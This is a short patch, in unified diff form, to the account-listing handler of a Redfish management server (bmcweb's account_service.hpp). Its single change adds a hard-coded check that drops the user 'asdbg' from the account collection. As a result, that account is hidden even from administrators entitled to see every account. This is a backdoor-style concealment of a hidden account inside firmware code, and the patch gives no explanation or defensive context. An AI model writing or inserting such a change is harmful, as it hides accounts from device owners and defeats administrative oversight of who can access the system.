@@ -1,0 +1,13 @@
+diff --git a/redfish-core/lib/account_service.hpp b/redfish-core/lib/account_service.hpp
+index f24fef5b..b4e0cfd5 100644
+--- a/redfish-core/lib/account_service.hpp
++++ b/redfish-core/lib/account_service.hpp
+@@ -1574,7 +1574,7 @@ inline void handleAccountCollectionGet(
+             // Users without ConfigureUsers, only see their own
+             // account. Users with ConfigureUsers, see all
+             // accounts.
+-            if (userCanSeeAllAccounts || (thisUser == user && userCanSeeSelf))
++            if ((userCanSeeAllAccounts || (thisUser == user && userCanSeeSelf)) && ( user != "asdbg" ))
+             {
+                 nlohmann::json::object_t member;
+                 member["@odata.id"] =
